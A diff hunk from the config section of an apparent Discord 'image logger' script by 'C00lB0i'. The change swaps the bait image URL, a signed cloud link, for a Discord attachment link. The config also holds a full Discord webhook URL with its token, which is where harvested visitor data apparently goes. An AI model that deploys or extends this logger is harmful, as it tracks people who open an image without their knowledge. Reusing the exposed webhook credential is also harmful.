@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1454867907472265238/-XZakIfHUAsiOkyMKt7h-FM9lfebvgle5Z7BWoQAPiOcWNkolfbbP_d0FV6cmeo5bnix",
-    "image": "https://eu-central.storage.cloudconvert.com/tasks/8f262aaa-6896-41f8-b821-3d073d7b270e/9HZBYcvaOEnh4tOp5EqgcCr_vKH7cjFJwkvw-45Dfjs.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20251228%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20251228T162757Z&X-Amz-Expires=86400&X-Amz-Signature=a26e5ce0df8a8a64e8013dd191f29d4a408cc6938cae268db083366e1cbfb35c&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%229HZBYcvaOEnh4tOp5EqgcCr_vKH7cjFJwkvw-45Dfjs.png%22&response-content-type=image%2Fpng&x-id=GetObject", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1454867824941207808/1456572492498993225/c9dd18269f72cc2a44e3ff0cb4b0bf09.jpg?ex=6958da58&is=695788d8&hm=4e81a3fd9ce55ed91f362e4fc9a80675efda0249108dbf1186e424454e5a55da", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
